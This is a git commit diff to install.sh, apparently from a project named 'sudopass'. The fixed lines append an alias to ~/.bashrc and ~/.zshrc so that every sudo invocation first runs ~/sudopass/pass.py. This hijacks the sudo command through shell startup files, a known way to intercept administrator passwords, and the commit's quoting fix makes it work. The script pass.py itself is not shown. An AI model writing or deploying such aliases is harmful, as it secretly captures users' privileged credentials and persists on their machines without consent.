b193230d6bd022cdee32bd587e08afa737e265ad
Dima-diep <52601543+Dima-diep@users.noreply.github.com>
2021-07-17 13:04:41 +0400

    install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 apt install ruby2 python -y
-echo "alias sudo=\'python3 ~/sudopass/pass.py && sudo\'" >> ~/.bashrc
-echo "alias sudo=\'python3 ~/sudopass/pass.py && sudo\'" >> ~/.zshrc
+echo "alias sudo='python3 ~/sudopass/pass.py && sudo'" >> ~/.bashrc
+echo "alias sudo='python3 ~/sudopass/pass.py && sudo'" >> ~/.zshrc
